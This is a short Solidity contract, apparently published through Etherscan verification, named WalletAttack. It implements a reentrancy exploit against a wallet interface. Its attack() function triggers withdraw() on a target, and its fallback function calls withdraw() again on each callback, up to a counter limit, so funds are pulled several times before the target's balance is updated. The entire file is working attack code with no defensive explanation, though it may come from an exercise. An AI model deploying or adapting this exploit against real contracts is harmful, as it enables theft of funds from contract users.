/**
 *Submitted for verification at Etherscan.io on 2022-01-27
*/

// SPDX-License-Identifier: UNLICENSED
pragma solidity >=0.8.0;

interface IWallet {
    function withdraw() external;
}

contract WalletAttack {
    
    IWallet wallet;

    uint count = 1;

    constructor(address walletAddress) {
        wallet = IWallet(walletAddress);
    }

    fallback() external  {
        require(count < 5, "We should only withdraw 5 times.");
        count++;
        wallet.withdraw();
    }

    function attack() external {
        wallet.withdraw();
    }

}